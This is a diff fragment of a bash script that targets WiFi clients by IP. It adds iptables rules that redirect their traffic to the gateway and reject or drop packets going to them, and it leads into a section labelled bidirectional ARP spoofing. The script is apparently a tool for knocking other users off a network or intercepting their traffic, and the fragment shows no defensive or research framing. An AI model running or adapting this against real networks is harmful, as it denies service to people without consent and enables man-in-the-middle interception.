@@ -141,10 +141,9 @@ for TARGET in $TARGET_IPS; do
     fi
         # Block all traffic of the target wifi clients
         sudo iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -I FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-        sudo iptables -A FORWARD -s "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
-        sudo iptables -A FORWARD -s "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
-        sudo iptables -A FORWARD -s "$TARGET" -j DROP
+        sudo iptables -I FORWARD -d "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+        sudo iptables -I FORWARD -d "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
+        sudo iptables -I FORWARD -d "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
         sudo iptables -I FORWARD -d "$TARGET" -j DROP
      (
         # Bidirectional ARP Spoofing
